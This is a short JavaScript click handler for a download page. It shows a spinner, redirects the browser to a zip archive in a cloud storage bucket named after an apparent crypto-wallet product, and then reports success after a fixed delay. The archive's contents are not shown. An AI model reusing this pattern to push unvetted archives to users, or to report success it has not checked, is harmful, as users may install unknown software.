/**
 * Handles the download button click event and manages the UI state transitions
 */
function handleDownload() {
    // Hide download button
    const downloadBtn = document.getElementById('downloadBtn');
    downloadBtn.style.display = 'none';

    // Show loading state
    const spinner = document.getElementById('spinner');
    const statusText = document.getElementById('status-text');
    spinner.style.display = 'block';
    statusText.textContent = 'Preparing your download...';

    // Start download after a short delay
    setTimeout(() => {
        window.location.href = 'https://storage.googleapis.com/dapper-eth-production_artifacts/1.0.0.44_0.zip';

        // Show success state
        setTimeout(() => {
            spinner.style.display = 'none';
            document.getElementById('checkmark').style.display = 'block';
            statusText.textContent = 'Download started! Please check your downloads folder.';
        }, 1000);
    }, 2000);
}

// Add click handler when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const downloadBtn = document.getElementById('downloadBtn');
    downloadBtn.addEventListener('click', handleDownload);
}); 